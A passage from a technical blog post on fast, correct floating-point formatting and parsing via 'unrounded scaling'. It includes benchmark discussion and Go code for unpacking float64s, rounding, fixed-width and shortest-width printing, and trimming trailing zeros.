own bignum-based code.\nIn general the C library implementations have not kept pace\nwith recent algorithms and are slower than any of the others.ryu: Adams’sRyū library, using thed2exp_bufferedfunction.\nIt uses the Ryū Printf algorithm [3].uscale: The unrounded scaling approach, using the Go code in this post.uscalec: A C translation of the unrounded scaling Go code.Here is a scatterplot showing the times required to formatfto 17 digits,\nrunning on the Linux system:(Click on any of the graphs in this post for a larger view.)The X axis is the log of the floating point inputf,\nand\nthe Y axis is the time required for a single conversion of the given input.\nThe scatterplot makes many things clear. For example, it is obvious that\nthere are two kinds of implementations.\nThose that use bignums take longer for large exponents and\nhave a “winged” scatterplot,\nwhile those that avoid bignums run at a mostly constant speed across\nthe entire exponent range.\nThe scatterplot also highlights many interesting data-dependent patterns in the timings,\nmost of which I have not investigated.\nA friend remarked that you could probably spend a whole career\nanalyzing the patterns in this one plot.For our purposes, it would help to have a clearer comparison\nof the speed of the different algorithms.\nThe right tool for that is a plot of the cumulative distribution function (CDF),\nwhich looks like this:Now time is on the X axis (still log scale), and the Y axis plots what\nfraction of the inputs ran in that time or less.\nFor example, we can see that dblconv’s fast path applies to most inputs,\nbut its slow path is much slower than Linux glibc or\neven Gay’s original C library.The CDF only plots the middle 99.9% of timings\n(dropping the 0.05% fastest and slowest),\nto avoid tails caused by measurement noise.\nIn general, measurements are noisier on the Mac because\nARM64 timers only provide ~20ns precision,\ncompared to the x86’s sub-nanosecond precision.Here are the scatterplots and CDFs for 6-digit output on the two systems: For the last decade, there has been a new algorithm for floating-point printing and parsing\nevery few years.\nGiven the simplicity and speed of the algorithms in this post\nand the increasingly small deltas between successive algorithms,\nperhaps we are nearing an optimal solution.Fixed-Point and Floating-Point NumbersFixed-point numbers have the formf=m·Befor an integer mantissam, constant baseB, and constant (fixed) exponente.\nWe can create fixed-point representations\nin any base, but the most common are base 2 (for computers)\nand base 10 (for people).\nThis diagram shows fixed-point numbers at various scales\nthat can represent numbers between 0 and 1:Using a smaller scaling factor increases precision\nat the cost of larger mantissas.\nWhen representing very large numbers, we can use\nlarger scaling factors to reduce the mantissa size.\nFor example, here are various representations of\nnumbers around one billion:Floating-point numbers are the same as base-2 fixed-point numbers except thatechanges with\nthe overall size of the number.\nSmall numbers use very small scaling factors\nwhile large numbers use large scaling factors,\naiming to keep the mantissas a constant length.\nFor float64s, the exponenteis chosen so that the mantissamhas 53 bits,\nmeaningm∈[252,253).\nFor example, for numbers in[½,1), float64s usee=−53;\nfor numbers in[1,2)they usee=−52;\nand so on.[The notation[a,b)is ahalf-open interval, which includesabut notb.\nIn contrast, theclosed interval[a,b]includes bothaandb.\nWe writex∈[a,b)orx∈[a,b]to say thatxis in that interval.\nUsing this notation,m∈[252,253)means252≤m<253.]In addition to limiting the mantissa size, we must also limit the exponent,\nto keep the overall number a fixed size.\nFor float64s, assumingm∈[252,253), the exponente∈[−1074,971].A float64 consists of 1 sign bit, 11 exponent bits, and 52 mantissa bits.\nThenormal11-bit exponent encodings0x001through0x3fedenotee=−1074throughe=971.\nFor those, the mantissam∈[252,253),\nand it is encoded into only 52 bits by omitting the leading 1 bit.\nThe special exponent encoding0x3ffis used for infinity and not-a-number.\nThat leaves the encoding0x000, which is also special.\nIt denotese=−1074(like0x001does)\nbut with mantissasm∈[0,252)without an implicit leading 1.\nThesesubnormalsordenormalized numbers[8]\ncontinue the fixed-point2−1074scale down to zero,\nwhich ends up encoded (not coincidentally) as 64 zero bits.Other definitions of floating point numbers use different interpretations.\nFor example the IEEE754 standard usesm∈[1,2)withe∈[−1023,1023],\nwhile the C standard libaryfrexpfunction usesm∈[½,1)withe∈[−1022,1024].\nBoth of these choices makemitself a fixed-point number instead of an integer.\nOur integer definition lets us use integer math.\nThese interpretations are all equivalent and differ only by a constant added toe.This description of float64s applies to float32s as well, but with different constants. This table summarizes the two encodings:float32float64sign bits11encoded mantissa bits2352encoded exponent bits811exponent range form∈[1,2)[−127,127][−1023,1023]exponent range for integerm[−150,104][−1074,971]normal numbers[223,224)·2[−150,104][252,253)·2[−1074,971]subnormal numbers[0,223)·2−150[0,252)·2−1074exponent range for 64-bitm[−190,64][−1085,960]normal numbers[263,264)·2[−190,64][263,264)·2[−1085,960]subnormal numbers[0,263)·2−190[0,263)·2−1085To convert a float64 to its bits, we use Go’smath.Float64bits.// unpack64 returns m, e such that f = m * 2**e.// The caller is expected to have handled 0, NaN, and ±Inf already.// To unpack a float32 f, use unpack64(float64(f)).func unpack64(f float64) (uint64, int) {\n\tconst shift = 64 - 53\n\tconst minExp = -(1074 + shift)\n\tb := math.Float64bits(f)\n\tm := 1<<63 | (b&(1<<52-1))<<shift\n\te := int((b >> 52) & (1<<shift - 1))\n\tif e == 0 {\n\t\tm &^= 1 << 63\n\t\te = minExp\n\t\ts := 64 - bits.Len64(m)\n\t\treturn m << s, e - s\n\t}\n\treturn m, (e - 1) + minExp\n}fpfmt/fpfmt.go:23,39To convert back, we use Go’smath.Float64frombits.// pack64 takes m, e and returns f = m * 2**e.// It assumes the caller has provided a 53-bit mantissa m// and an exponent that is in range for the mantissa.func pack64(m uint64, e int) float64 {\n\tif m&(1<<52) == 0 {\n\t\treturn math.Float64frombits(m)\n\t}\n\treturn math.Float64frombits(m&^(1<<52) | uint64(1075+e)<<52)\n}fpfmt/fpfmt.go:41,49[Other presentations use “fraction” and “significand” instead of “mantissa”.\nThis post uses mantissa for consistency with my 2011 post\nand because I generally agree with Agatha Mallett’s excellent\n“In Defense of ‘Mantissa’”.]Unrounded NumbersFloating-point operations are defined as if computed exactly to infinite precision\nand then rounded to the nearest actual floating-point number,\nbreaking ties by rounding to an even mantissa.\nOf course, real implementations don’t use infinite precision;\nthey only keep enough precision to round properly.\nWe will use the same idea.\nIn our algorithms, we want the scaling operation to eventually evaluate to an integer,\nbut we want to give the caller control over the rounding step.\nSo instead of returning an integer, we will return anunrounded number,\nwhich contains all the information needed to round it in a variety of ways.The unrounded form of any real numberx, which we will write as as⟨x⟩,\nis the truncated integer part ofxfollowed by two more bits.\nThose bits indicate (1) whether the fractional part ofxwas at least ½, and (2) whether the fractional part was not exactly 0 or ½.\nIf you think ofxas a real number written in binary, the first extra bit is the bit immediately after the “binary point”—the bit that represents2−1, aka the ½ bit—and the second extra bit is the OR of all the bits after the ½ bit.This definition applies even to numbers that require an infinite binary representation.\nFor example, just as 1/3 requires an infinite decimal representation ‘0.333...’,\n1.6 requires an infinite binary representation ‘1.1001100110011...’.\nThe unrounded version⟨1.6⟩is finite: ‘1.11’.\nBut instead of reading unrounded numbers in binary,\nlet’s print⟨x⟩as‘n.hs’wherenis the integer part⟨x⟩>>2,his 0 or 5, andsis ‘+’ when the second bit is 1.\nThen⟨1.6⟩is written ‘1.5+’.⟨x⟩=⌊4x⌋|(4x≠⌊4x⌋)⟨6exactly⟩=24=‘6.0’⟨6.000001⟩=25=‘6.0+’⟨6.499999⟩=25=‘6.0+’⟨6.5exactly⟩=26=‘6.5’⟨6.500001⟩=27=‘6.5+’⟨6.999999⟩=27=‘6.5+’⟨7exactly⟩=28=‘7.0’Let’s implement unrounded numbers in Go.type unrounded uint64\n\nfunc unround(x float64) unrounded {\n\treturn unrounded(math.Floor(4*x)) | bool2[unrounded](math.Floor(4*x) != 4*x)\n}\n\nfunc (u unrounded) String() string {\n\treturn fmt.Sprintf(\"⟨%d.%d%s⟩\", u>>2, 5*((u>>1)&1), \"+\"[1-u&1:])\n}fpfmt/fpfmt.go:52,61Thebool2function converts a boolean to an integer.\n(The Go compiler will implement this using an inlined conditional move.)// bool2 converts b to an integer: 1 for true, 0 for false.func bool2[T ~int | ~uint64](b bool) T {\n\tif b {\n\t\treturn 1\n\t}\n\treturn 0\n}fpfmt/fpfmt.go:15,21We won’t use theunroundconstructor in our actual code, but it’s helpful for playing.\nFor example, we can try the examples we just saw:row(\"x\", \"raw\", \"str\")\nfor _, x := range []float64{6, 6.001, 6.499, 6.5, 6.501, 6.999, 7} {\n    u := unround(x)\n    row(x, uint64(u), u)\n}\ntable()x      raw  str\n6      24   ⟨6.0⟩\n6.001  25   ⟨6.0+⟩\n6.499  25   ⟨6.0+⟩\n6.5    26   ⟨6.5⟩\n6.501  27   ⟨6.5+⟩\n6.999  27   ⟨6.5+⟩\n7      28   ⟨7.0⟩The unrounded form⟨x⟩holds the information needed by all the usual rounding operations.\nAdding 0, 1, 2, or 3 and then dividing by four (or shifting right by two) yields: floor, round with ½ rounding down, round with ½ rounding up, and ceiling.\nIn floating-point math, we want to round with ½ rounding to even, meaning 1½ and 2½ both round to 2.\nWe can do that by adding1+odd(x),\nwhereodd(x)is 0 or 1 according to whetherxis odd.\nThat’s just the low bit ofx:odd(x)=(x&1)=(⟨x⟩>>2)&1.Putting that all together:⌊⟨x⟩⌋=(⟨x⟩+0)>>2(floor)[⟨x⟩]−=(⟨x⟩+1)>>2(round,halfdown)[⟨x⟩]even=(⟨x⟩+1+odd(x))>>2(round,halftoeven)=(⟨x⟩+1+((⟨x⟩>>2)&1))>>2[⟨x⟩]+=(⟨x⟩+2)>>2(round,halfup)⌈⟨x⟩⌉=(⟨x⟩+3)>>2(ceiling)In Go:func (u unrounded) floor() uint64         { return uint64((u + 0) >> 2) }\nfunc (u unrounded) roundHalfDown() uint64 { return uint64((u + 1) >> 2) }\nfunc (u unrounded) round() uint64         { return uint64((u + 1 + (u>>2)&1) >> 2) }\nfunc (u unrounded) roundHalfUp() uint64   { return uint64((u + 2) >> 2) }\nfunc (u unrounded) ceil() uint64          { return uint64((u + 3) >> 2) }fpfmt/fpfmt.go:62,66row(\"x\", \"floor\", \"round½↓\", \"round\", \"round½↑\", \"ceil\")\nfor _, x := range []float64{6, 6.25, 6.5, 6.75, 7, 7.5, 8.5} {\n    u := unround(x)\n    row(u, u.floor(), u.roundHalfDown(), u.round(), u.roundHalfUp(), u.ceil())\n}\ntable()x       floor  round½↓  round  round½↑  ceil\n⟨6.0⟩   6      6        6      6        6\n⟨6.0+⟩  6      6        6      6        7\n⟨6.5⟩   6      6        6      7        7\n⟨6.5+⟩  6      7        7      7        7\n⟨7.0⟩   7      7        7      7        7\n⟨7.5⟩   7      7        8      8        8\n⟨8.5⟩   8      8        8      9        9Dividing unrounded numbers preserves correct rounding as long as the second extra bit\nis maintained correctly: once it is set to 1, it has to stay a 1 in all future results.\nThis gives the second extra bit its shorter name: thesticky bit.To divide an unrounded number, we do a normal divide but force the sticky bit to 1\nwhen there is a remainder.\nRight shift does the same.⟨x/n⟩=(⟨x⟩/n)|(⟨x⟩modn≠0)|(⟨x⟩&1)⟨x>>n⟩=(⟨x⟩>>n)|(⟨x⟩mod2n≠0)|(⟨x⟩&1)For example, if we rounded 15.4 to an integer 15 and then divided it by 6,\nwe’d get 2.5, which rounds down to 2,\nbut the more precise answer would be 15.4/6 = 2.57, which rounds up to 3.\nAn unrounded division handles this correctly:⟨15.4⟩=61‘15.0+’“alittlemorethan15”⟨15.4/6⟩=11‘2.5+’“alittlemorethan2½”[⟨15.4/6⟩]=3Let’s implement division and right shift in Go:func (u unrounded) div(d uint64) unrounded {\n\tx := uint64(u)\n\treturn unrounded(x/d) | u&1 | bool2[unrounded](x%d != 0)\n}\n\nfunc (u unrounded) rsh(s int) unrounded {\n\treturn u>>s | u&1 | bool2[unrounded](u&((1<<s)-1) != 0)\n}fpfmt/fpfmt.go:69,76u := unround(15.1).div(6)\nfmt.Println(u, u.round())⟨2.5+⟩ 3Finally, we are going to need to be able to nudge an unrounded number\nup or down before computing a ceiling or floor,\nas if we added or subtracting a tiny amount.\nLet’s add that:func (u unrounded) nudge(δ int) unrounded { return u + unrounded(δ) }fpfmt/fpfmt.go:67row(\"x\", \"nudge(-1).floor\", \"floor\", \"ceil\", \"nudge(+1).ceil\")\nfor _, x := range []float64{15, 15.1, 15.9, 16} {\n    u := unround(x)\n    row(u, u.nudge(-1).floor(), u.floor(), u.ceil(), u.nudge(+1).ceil())\n}x        nudge(-1).floor  floor  ceil  nudge(+1).ceil\n⟨15.0⟩   14               15     15    16\n⟨15.0+⟩  15               15     16    16\n⟨15.5+⟩  15               15     16    16\n⟨16.0⟩   15               16     16    17Floating-point hardware maintains three extra bits to round\nall arithmetic operations correctly.\nFor just division and right shift, we can get by with only two bits.Unrounded ScalingThe fundamental insight of this post is that all\nfloating-point conversions can be written correctly\nand simply usingunrounded scaling,\nwhich multiplies a numberxby a power of two and a power of ten\nand returns the unrounded product.uscale(x,e,p)=⟨x·2e·10p⟩.Whenpis negative, the value10pcannot be stored exactly in any finite binary floating-point number,\nso any implementation of uscale must be careful.In Go, we can implement uscale using big integers and an unrounded division:func uscale(x uint64, e, p int) unrounded {\n    num :=   mul(big(4), big(x), pow(2, max(0, p)),  pow(10, max(0, e)))\n    denom := mul(                pow(2, max(0, -p)), pow(10, max(0, -e)))\n    div, mod := divmod(num, denom)\n    return unrounded(div.uint64() | bool2[uint64](!mod.isZero()))\n}Themaxexpressions choose between multiplying2eintonumwhene>0or multiplying2−eintodenomwhene<0,\nand similarly for10p.\nThedivmodimplements the floor, andmod.isZeroreports\nwhether the floor was exact.This implementation of uscale is correct but inefficient.\nIn our usage,eandpwill mostly cancel out,\ntypically with opposite signs,\nand the inputxand resultuscale(x,e,p),\nwill always fit in 64 bits.\nThat limited input domain and range makes it possible\nto implement a very fast, completely accurate uscale,\nand we’ll see that implementation later.Our actual implementation will be split into two functions,\nto allow sharing some computations derived frompande.\nInstead ofuscale(x, e, p), the fast Go version will be called asuscale(x, prescale(e, p, log2Pow10(p))).\nAlso, callers are responsible for passing in anxleft-shifted to have its\nhigh bit set.\nTheunpackfunction we looked at already arranged that for its result,\nbut otherwise callers need to do something like:shift = 64 - bits.Len64(x)\n... uscale(x<<shift, prescale(e-shift, p, log2Pow10(p))) ...Conceptually, uscale maps numbers on one fixed-point scale to numbers on another,\nincluding converting between binary and decimal scales.\nFor example, consider the scales2−13and10−4:Givenxfrom the2−13side,uscale(x,−13,4)maps to the equivalent\npoint on the10−4side;\nand givenxfrom the10−4,uscale(x,13,−4)maps to the equivalent\npoint on the2−13side.\nBefore we look at the fast implementation ofuscale,\nlet’s look at how it simplifies all the floating-point printing\nand parsing algorithms.Fixed-Width PrintingOur first application of uscale is fixed-width printing.\nGivenf=m·2e, we want to compute its\napproximate equivalentd·10de, wheredhas exactlyndigits.\nIt only takes 17 digits to uniquely identify any float64,\nso we’re willing to limitn≤18,\nwhich will ensuredfits in a uint64.\nThe strategy is to multiplyfby10pfor somepand then round it to an integerd.\nThen the result isd·10−p.Then-digit requirement meansd=m·2e·10p∈[10n−1,10n).\nFrom this we can derivep:m·2e·10p∈[10n−1,10n)m·2e·10p∈10n−1·[1,10)[factoringrange](log10m·2e)+p∈n−1+[0,1)[takinglog]p∈n−1−(log10m·2e)+[0,1)[isolatingp]p∈n−1−((log10m·2e)−[0,1))[regrouping]p=n−1−⌊log10m·2e⌋[pisaninteger]p=n−1−⌊(log102)·(e+log2m)⌋[changinglogbase]It is okay forpto be too big—we will get an extra digit that we can divide away—so\nwe can approximatelog2masbits(m)−1, wherebits(m)is the bit length ofm.\nThat gives usp=n−1−⌊(log102)·(e+bits(m)−1)⌋.\nWith this derivation ofp, uscale does the rest of the work.The floor expression is a simple linear function and can be computed\nexactly for our inputs using fixed-point arithmetic:// log10Pow2(x) returns ⌊log₁₀ 2**x⌋ = ⌊x * log₁₀ 2⌋.func log10Pow2(x int) int {// log₁₀ 2 ≈ 0.30102999566 ≈ 78913 / 2^18return (x * 78913) >> 18\n}fpfmt/fpfmt.go:78,82Thelog2Pow10function, which we mentioned above and need to\nuse when callingprescale, is similar:// log2Pow10(x) returns ⌊log₂ 10**x⌋ = ⌊x * log₂ 10⌋.func log2Pow10(x int) int {// log₂ 10 ≈ 3.32192809489 ≈ 108853 / 2^15return (x * 108853) >> 15\n}fpfmt/fpfmt.go:84,88Now we can put everything together:// FixedWidth returns the n-digit decimal form of f as d * 10**p.// n can be at most 18.func FixedWidth(f float64, n int) (d uint64, p int) {\n\tif n > 18 {\n\t\tpanic(\"too many digits\")\n\t}\n\tm, e := unpack64(f)\n\tp = n - 1 - log10Pow2(e+63)\n\tu := uscale(m, prescale(e, p, log2Pow10(p)))\n\td = u.round()\n\tif d >= uint64pow10[n] {\n\t\td, p = u.div(10).round(), p-1\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:96,110That’s the entire conversion!The code splitsfintom,e;\ncomputespas just described;\nand then usesuscaleandroundto computed=f·10p.\nIf the result has an extra digit,\neither because our approximate log madeptoo big,\nor because of rollover during rounding,\nwe divide the unrounded form by 10, round again, and updatep.\nWhen we approximatedlog2mby counting bits,\nwe used the exact log of the greatest power of two less than or equal tom,\nso the computeddmust be less than twice the intended limit10n,\nmeaning the leading digit (if there are too many digits) must be 1.\nAnd rollover only happens for ‘999...’,\nso it is not possible to have both an extra digit and rollover.As an example conversion,\nconsider a float64 approximation ofπ(0x1921fb54442d18·2−51) to 15 decimal digits.\nWe havee=−51,n=15, andbits(m)=53,\nsop=n−1−⌊(log102)·(e+bits(m)−1)⌋=14.The2−51and10−14scales align like this:Thenuscale(0x1921fb54442d18,−51,14)returns the unrounded number ‘314159265358979.0+’,\nwhich rounds to 314159265358979.\nOur answer is then314159265358979·10−14.Parsing DecimalsUnrounded scaling also lets us parse decimal representations of floating-point numbers efficiently.\nLet’s assume we’ve taken care of parsing a string like ‘1.23e45’\nand now have an integer and exponent liked=123,p=45−2=43.\nTo convertd·10pto a float64,\nwe can choose an appropriateeso thatd·2e·10p∈[252,253)and then return[uscale(d,e,p)]·2−e.The derivation ofeis similar to the derivation ofpfor printing:d·2e·10p∈[252,253)d·2e·10p∈252·[1,2)[factoringrange](log2d·10p)+e∈52+[0,1)[takinglog]e∈52−(log2d·10p)+[0,1)[isolatinge]e∈52−((log2d·10p)−[0,1))[regrouping]e=52−⌊log2d·10p⌋[pisaninteger]e=52−⌊(log2d)+(log210)·p⌋[changinglogbase]Once again, it is okay to overestimatee, so we can approximatelog2d=bits(d)−1, yieldinge=53−bits(d)−⌊(log210)·p⌋.\nIfeis very large,−ewill be very small,\nmeaning we will be creating a subnormal,\nso we need to round to a smaller number of bits.\nTo handle this, we capeat 1074,\nwhich caps−eat−1074.\nAs before, due to the approximation oflog2d, the scaled result is at most twice as large as our target,\nmeaning it might have one extra bit to shift away.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\te := min(1074, 53-b-log2Pow10(p))\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, log2Pow10(p)))\n\tm := u.round()\n\tif m >= 1<<53 {\n\t\tm, e = u.rsh(1).round(), e-1\n\t}\n\treturn pack64(m, -e)\n}fpfmt/unopt/fpfmt.go:111,125FixedWidthandParsedemonstrate\nexactly how similar printing and parsing really are.\nIn printing, we are givenm,eand\nfindp; thenuscale(m,e,p)converts binary to decimal.\nIn parsing, we are givend,pand finde;\nthenuscale(d,e,p)converts decimal to binary.We can make parsing a little faster with a few hand optimizations.\nThis optimized version introduceslpto avoid callinglog2Pow10twice,\nand it implements the extra digit handling in branch-free code.// Parse rounds d * 10**p to the nearest float64 f.// d can have at most 19 digits.func Parse(d uint64, p int) float64 {\n\tif d > 1e19 {\n\t\tpanic(\"too many digits\")\n\t}\n\tb := bits.Len64(d)\n\tlp := log2Pow10(p)\n\te := min(1074, 53-b-lp)\n\tu := uscale(d<<(64-b), prescale(e-(64-b), p, lp))// This block is branch-free code for://\tif u.round() >= 1<<53 {//\t\tu = u.rsh(1)//\t\te = e - 1//\t}s := bool2[int](u >= unmin(1<<53))\n\tu = (u >> s) | u&1\n\te = e - s\n\n\treturn pack64(u.round(), -e)\n}// unmin returns the minimum unrounded that rounds to x.func unmin(x uint64) unrounded {\n\treturn unrounded(x<<2 - 2)\n}fpfmt/fpfmt.go:112,138Now we are ready for our next challenge: shortest-width printing.Shortest-Width PrintingShortest-width printing means to prepare a decimal representation\nthat a floating-point parser would convert back to the exact samefloat64,\nusing as few digits as possible.\nWhen there are multiple possible shortest decimal outputs,\nwe insist on the one that is nearest the original input,\nnamely the correctly-rounded one.\nIn general, 17 digits are always enough to uniquely identify afloat64,\nbut sometimes fewer can be used, even down to a single digit in numbers like 1, 2e10, and 3e−42.An obvious approach would be to useFixedPrintfor increasing values ofn,\nstopping whenParse(FixedPrint(f, n)) == f.\nOr maybe we should derive an equation fornand then useFixedPrint(f, n)directly.\nSurprisingly, neither approach works:Short(f)is not necessarilyFixedPrint(f, n)for somen.\nThe simplest demonstration of this isf=289=618970019642690137449562112=0x10000000000000·237,\nwhich looks like this:Becausefis a power of two, the floating-point exponent\nchanges atf,\nas does the spacing between floating-point numbers.\nThe next smallest value is0x1ffffffffffff·2−38,\nmarked on the diagram as0xffffffffffff½·2−37.\nThe dotted lines mark the halfway points betweenfand its nearest floating point neighbors.\nThe accurate decimal answers are those at or between the dotted lines,\nall of which convert back tof.The correct rounding offto 16 digits ends in …901: the next digit infis 3,\nso we should round down.\nHowever, because of the spacing change aroundf,\nthat correct decimal rounding does not convert back tof.\nAFixedPrintloop would choose a 17-digit form instead.\nBut there is an accurate 16-digit form, namely …902.\nThat decimal is closer tofthan it is to any other float64,\nmaking it an accurated.\nAnd since the closer 16-digit value …901 is not an accurated,Shortshould use …902 instead.Assuming as usual thatf=m·2e,\nlet’s definefootprint(f)to be the distance between the midpoints fromfto its\nfloating-point neighbors.\nNormally those neighbors are2ein either direction—the midpoints are(m±½)·2e—sofootprint(f)=2e.\nAt a power of two with an exponent change,\nthe lower midpoint is instead(m−¼)·2e,\nsofootprint(f)=¾·2e.\nThe rounding paradox can only happen for powers of two\nwith this kind of skewed footprint.All that is to say we cannot useFixedWidthwith “the rightn”.\nBut we can use scale directly with “the rightp.”\nSpecifically, we can compute the midpoints betweenfand its floating-point neighbors\nand scale them to obtain the\nminimum and maximum valid choices ford.\nThen we can make the best choice:If one of the validdends in 0, use it after removing trailing zeros.(Choosing the rightpwill allow at most ten consecutive integers,\nso at most will one end in 0.)If there is only one validd, use it.Otherwise there are at least two validd, at least one on each side off;\nuse the correctly rounded one.Here is an example of the first case: one of the validdends in zero.We already saw an example of the second case: only one validd.\nFor numbers with symmetric footprints, that will be the\ncorrectly roundedd.\nAs we saw for numbers with skewed footprints,\nthat may not be the correctly roundedd,\nbut it is still the correct answer.Finally, here is an example of the third case: multiple validd,\nbut none that end in zero.\nNow we should use the correctly rounded one.This sounds great, but how do we determine the rightp?\nWe wantfootprint(f)to allow at least one decimal integer,\nbut at most ten, meaning1≤footprint(f)<10.\nLuckily, we can hit that target exactly.For a symmetric footprint:footprint(f)·10p∈[1,10)2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/2e)·[1,10)[isolatingp]p∈−(log102)·e+[0,1)[takinglog]p∈−((log102)·e−[0,1))[regrouping]p=−⌊(log102)·e⌋[pisaninteger]For a skewed footprint:footprint(f)·10p∈[1,10)¾·2e·10p∈[1,10)[definitionoffootprint(f)]10p∈(1/(¾·2e))·[1,10)[isolatingp]p∈−(log10¾+(log102)·e)+[0,1)[takinglog]p∈−(log10¾+(log102)·e−[0,1))[regrouping]p=−⌊log10¾+(log102)·e⌋[pisaninteger]For the symmetric footprint, we can uselog10Pow2,\nbut for the skewed footprint, we need a new approximation:// skewed computes the skewed footprint of m * 2**e,// which is ⌊log₁₀ 3/4 * 2**e⌋ = ⌊e*(log₁₀ 2)-(log₁₀ 4/3)⌋.func skewed(e int) int {\n\treturn (e*631305 - 261663) >> 21\n}fpfmt/fpfmt.go:234,238We should worry about a footprint with decimal width exactly 1,\nsince iffhad an odd mantissa,\nthe midpoints would be excluded.\nIn that case, if the decimals were the exact midpoints,\nthere would be no decimal between them,\nmaking the conversion invalid.\nBut it turns out we should not worry too much.\nFor a skewed footprint,¾·2e·10pcan never be exactly 1,\nbecause nothing can divide away the 3.\nFor a symmetric footprint,2e·10p=1can only happen fore=p=0,\nbut then scaling is a no-op,\nso that the decimal integers are exactly the binary integers.\nThe non-integer midpoints map to non-integer decimals.When we compute the decimal equivalents of the midpoints,\nwe will use ceiling and floor instead of rounding them,\nto make sure the integer results are valid decimal answers.\nIf the mantissamis odd, we will nudge the unrounded forms\ninward slightly before taking the ceiling or floor,\nsince rounding will be away fromm.The Go code is:// Short computes the shortest formatting of f,// using as few digits as possible that will still round trip// back to the original float64.func Short(f float64) (d uint64, p int) {\n\tconst minExp = -1085\n\n\tm, e := unpack64(f)\n\n\tvar min uint64\n\tz := 11// extra zero bits at bottom of m; 11 for 53-bit mif m == 1<<63 && e > minExp {\n\t\tp = -skewed(e + z)\n\t\tmin = m - 1<<(z-2)// min = m - 1/4 * 2**(e+z)} else {\n\t\tif e < minExp {\n\t\t\tz = 11 + (minExp - e)\n\t\t}\n\t\tp = -log10Pow2(e + z)\n\t\tmin = m - 1<<(z-1)// min = m - 1/2 * 2**(e+z)}\n\tmax := m + 1<<(z-1)// max = m + 1/2 * 2**(e+z)odd := int(m>>z) & 1\n\n\tpre := prescale(e, p, log2Pow10(p))\n\tdmin := uscale(min, pre).nudge(+odd).ceil()\n\tdmax := uscale(max, pre).nudge(-odd).floor()\n\n\tif d = dmax / 10; d*10 >= dmin {\n\t\treturn trimZeros(d, -(p - 1))\n\t}\n\tif d = dmin; d < dmax {\n\t\td = uscale(m, pre).round()\n\t}\n\treturn d, -p\n}fpfmt/fpfmt.go:198,232Notice that this algorithm requires either two or three calls touscale.\nWhen the number being printed has only one valid representation\nof the shortest length, we avoid the third call touscale.\nAlso notice that theprescaleresult is shared by all three calls.Whenm=263,min<263,\nmeaning it won’t be left shifted as far as possible\nduring the call touscale.\nAlthough we could detect this case and calluscalewith2·minande−1,\nusingminunmodified is fine:\nit is still shifted enough that the bitsuscaleneeds to return will stay in the high 64 bits of the 192-bit product,\nand using the sameelets us use the sameprescalework for all three calls.Trimming ZerosThetrimZerosfunction used inShortremoves any trailing zeros from its argument,\nupdating the decimal power. An unoptimized version is:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tif x%10 != 0 {\n\t\treturn x, p\n\t}\n\tx /= 10\n\tp += 1\n\n\tif x%100000000 == 0 {\n\t\tx /= 100000000\n\t\tp += 8\n\t}\n\tif x%10000 == 0 {\n\t\tx /= 10000\n\t\tp += 4\n\t}\n\tif x%100 == 0 {\n\t\tx /= 100\n\t\tp += 2\n\t}\n\tif x%10 == 0 {\n\t\tx /= 10\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/unopt/fpfmt.go:227,254The initial removal of a single zero gives an early return for\nthe common case of having no zeros.\nOtherwise, the code makes four additional checks that\ncollectively remove up to 16 more zeros.\nFor outputs with many zeros, these four checks run faster\nthan a loop removing one zero at a time.When compiling this code,\nthe Go compiler reduces the remainder checks to multiplications\nusing the following well-known optimization.\nAn exactuint64divisionx/cwherexmodc=0can be implemented byx·mwheremis theuint64multiplicative inverse ofc, meaningm·cmod264=1:\nSincecis also the multiplicative inverse ofm,x·mis\nlossless—all the exact multiples ofcmap to all of[0,(264−1)/c]—so\nthe non-multiples are forced to map to larger values.\nThis observation gives a quick test for whetherxis an exact multiple ofc:\ncheck whetherx·m≤(264−1)/c.Only oddchave multiplicative inverses modulo powers of two,\nso even divisors require more work.\nTo compute an exact divisionx/(c<<s),\nwe can use(x/c)>>sinstead.\nTo check for remainder, we need to check that those lowsbits are all zero before we shift them away.\nWe can merge that check with the range check by rotating those bits\ninto the high part instead of discarding them:\ncheck whetherx·m↻>s≤(264−1)/c,\nwhere↻>is right rotate.The Go compiler does this transformation automatically\nfor theifconditions intrimZeros,\nbut inside theifbodies, it does not reuse the\nexact quotient it just computed.\nI considered changing the compiler to recognize that pattern,\nbut instead I wrote out the remainder check by hand\nin the optimized version, allowing me to reuse the computed exact quotients:// trimZeros removes trailing zeros from x * 10**p.// If x ends in k zeros, trimZeros returns x/10**k, p+k.// It assumes that x ends in at most 16 zeros.func trimZeros(x uint64, p int) (uint64, int) {\n\tconst (\n\t\tmaxUint64 = ^uint64(0)\n\t\tinv5p8    = 0xc767074b22e90e21// inverse of 5**8inv5p4    = 0xd288ce703afb7e91// inverse of 5**4inv5p2    = 0x8f5c28f5c28f5c29// inverse of 5**2inv5      = 0xcccccccccccccccd// inverse of 5)// Cut 1 zero, or else return.if d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t} else {\n\t\treturn x, p\n\t}// Cut 8 zeros, then 4, then 2, then 1.if d := bits.RotateLeft64(x*inv5p8, -8); d <= maxUint64/100000000 {\n\t\tx = d\n\t\tp += 8\n\t}\n\tif d := bits.RotateLeft64(x*inv5p4, -4); d <= maxUint64/10000 {\n\t\tx = d\n\t\tp += 4\n\t}\n\tif d := bits.RotateLeft64(x*inv5p2, -2); d <= maxUint64/100 {\n\t\tx = d\n\t\tp += 2\n\t}\n\tif d := bits.RotateLeft64(x*inv5, -1); d <= maxUint64/10 {\n\t\tx = d\n\t\tp += 1\n\t}\n\treturn x, p\n}fpfmt/fpfmt.go:240,278This approach to trimming zeros is from Dragonbox.\nFor more about the general optimization,\nsee Warren’sHacker’s Delight[34],\nsections 10-16 and 10-17.Fast, Accurate ScalingThe conversion algorithms we examined are nice and simple.\nFor them to be fast,uscaleneeds to be fast while remaining correct.\nAlthough multiplication by2ecan be implemented by shifts,uscalecannot actually compute or multiply by10p—that would take too long whenpis a large positive or negative number.\nInstead, we can approximate10pas a floating-point numberpm·2pewith a 128-bit mantissa,\nlooked up in a table indexed 